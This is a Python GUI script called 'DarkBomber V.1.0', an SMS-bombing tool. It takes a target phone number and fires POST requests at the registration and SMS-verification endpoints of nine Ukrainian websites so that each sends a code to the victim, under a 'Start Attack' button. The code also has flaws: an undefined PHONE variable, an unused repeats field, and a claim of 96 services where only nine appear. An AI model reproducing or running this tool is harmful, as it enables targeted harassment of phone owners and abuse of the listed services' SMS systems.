import subprocess, os
try:
	import customtkinter
except:
	os.system('pip install customtkinter')	
import requests

customtkinter.set_appearance_mode('dark')
customtkinter.set_default_color_theme('green')

root = customtkinter.CTk()
root.geometry('500x350')
root.resizable(False, False)
root.title('DarkBomber V.1.0')

class Bomber:
	def __init__(self, verison):
		if verison == "0.1":
			pass
    
  # In version 1.0
	def set_proxy(self, woking):
		if woking:
			pass

	def bomber(self, number):
		try:
			req = requests.post('https://anc.ua/authorization/auth/v2/register', json={'login' : '+' + number})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://medics.ua/api/v1/verifications', json={"action_type":"registration","phone":number,"user":{"phone":PHONE}})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://api.sweet.tv/SignupService/SetPhone.json', json={"device":{"type":"DT_Web_Browser","application":{"type":"AT_SWEET_TV_Player"},"model":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36","firmware":{"versionCode":1,"versionString":"4.1.75"},"uuid":"352d46c9-66ad-4ed2-9177-53f902cf9391","supported_drm":{"widevine_modular": True},"screen_info":{"aspectRatio":0,"width":678,"height":634}},"phone":number})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://my.lun.ua/api/user/login', json={'login' : '+' + number})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://automoto.ua/uk/my-office/login', json={'phone': number})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://lovilave.com.ua/v2/sign/request', json={"Request":{"phone":number}})
			print(req.text)
		except:
			pass		

		try:
			req = requests.post('https://api.likari.in.ua/v2/auth/sms', json={"phone":number[2:]})
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://sushiya.ua/api/v1/user/auth', data=f'phone={number[2:]}&need_skeep=')
			print(req.text)
		except:
			pass
		try:
			req = requests.post('https://dnipro-m.ua/phone-verification/', json={"phone": number})
			print(req.text)
		except:
			pass				

	def run(self, number):
		self.number = number
		if str(number).isdigit() and len(number) > 7:
			self.bomber(number)
			pass

label = customtkinter.CTkLabel(master=root, width=300, text='DarkBomber V.1.0 💣', font=('Roboto', 20))
label.place(y=70, x=110)

entry = customtkinter.CTkEntry(master=root,width=160, border_width=0.4, placeholder_text='Номер телефона')
entry.place(y=140, x=90)

entry2 = customtkinter.CTkEntry(master=root,width=150, border_width=0.4, placeholder_text='Повторы')
entry2.place(y=140, x=260)

label = customtkinter.CTkLabel(master=root, width=300, text='Avaliable Services: 96')
label.place(y=100, x=105)


def func():
	bomber = Bomber('0.1')
	bomber.run(str(entry.get()))
	pass

button = customtkinter.CTkButton(master=root, text='Start Attack', width=100, height=30, command=func)
button.place(y=180, x=205)


label = customtkinter.CTkLabel(master=root, width=300, text='Made By @progman0 with love')
label.pack(side=customtkinter.BOTTOM, pady=10)

root.mainloop()
